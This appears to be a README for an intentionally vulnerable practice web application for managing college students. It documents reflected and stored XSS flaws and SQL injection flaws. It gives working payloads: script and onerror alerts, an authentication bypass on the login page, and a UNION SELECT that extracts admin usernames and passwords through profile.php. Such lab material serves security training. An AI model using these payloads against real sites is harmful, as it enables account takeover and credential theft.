# basic collage management 
is a vuln web site to XSS and SQLi

## XXS
### reflected XSS
> reflected XSS found in **all_students.php page at search function** 
> u can use `?search=<image%20src=s%20onerror=prompt(8)>` as a payload to test the vuln

### sotred XXS
> stored XSS found in **add_student.php page at Address field** 
> u can insert `<script>alert(2);</script>` in Address field as a payload 
> to test the vuln go to **all_students.php page** 


----------------------------------------------------------------


## SQLi

### SQLi Subverting application logic
> SQLi found in **login-page.php page at username field**
> u can insert `admin' -- -` or `admin' OR '1'='1 -- -` in username field as a payload if having a previuos knowloadege of user **admin** 


### UNION SQLi
> UNION SQLi found in **profile.php page through GET Parameter**
> u can inswer `/profile.php?id=' UNION SELECT username,password,NULL,NULL FROM admin where id = 'ID' -- -` in the url field as a payload. **ID = 1,2...**

